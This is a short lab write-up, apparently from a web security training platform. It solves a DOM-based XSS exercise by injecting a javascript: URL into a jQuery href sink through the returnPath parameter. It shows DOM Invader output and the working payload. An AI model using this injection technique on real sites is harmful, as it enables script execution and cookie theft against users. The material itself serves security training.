## 5 - DOM XSS in jQuery anchor href attribute sink using location.search source

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie.

## Notes

- Search page
- Possibility to leave a comment
- Feedback feature
- `/resources/js/jquery_1-8-2.js`

## Resume

1. Go on feedback page
2. Using DOM invader type the canary in `/feedback?returnPath=`
3. Open DOM invader and **Search for Canary**
4. Exploit the DOM XSS

## Solve

Enable DOM invader and go on `/feedback?returnPath=/feedback` and paste the random **canary** from DOM invader in the search feature : 

`/feedback?returnPath=ec7oxw8l`

Open DOM invader and click on **Search for Canary** and see : 

Sinks (1)
    jQuery.attr.href (1)
| Value | outerHTML | Frame path | Event | Options |
|---|---|---|---|---|
| `ec7oxw8l` |   | top | DOMContentLoaded | **Exploit** |

Stack Trace

```txt
-- DOM Invader: Logging stack trace
VM51:1     at Object.sfgaV (augmented-dom-instrumentation.js:1:1084)
    at _0x1ed255 (augmented-dom-instrumentation.js:1:122279)
    at Object.gqpPR (augmented-dom-instrumentation.js:1:69413)
    at Object.sXBzJ (augmented-dom-instrumentation.js:1:404822)
    at Object.apply (augmented-dom-instrumentation.js:1:416339)
    at HTMLDocument.<anonymous> (feedback?returnPath=ec7oxw8l:71:48)
    at k (jquery_1-8-2.js:2:16920)
    at Object.fireWith [as resolveWith] (jquery_1-8-2.js:2:17707)
    at p.ready (jquery_1-8-2.js:2:12438)
    at HTMLDocument.D (jquery_1-8-2.js:2:9843)
```

Then click on **Exploit** and follow the redirection to : 

```
/feedback?returnPath=javascript:alert(1)
```

```js
javascript:alert(1)
```
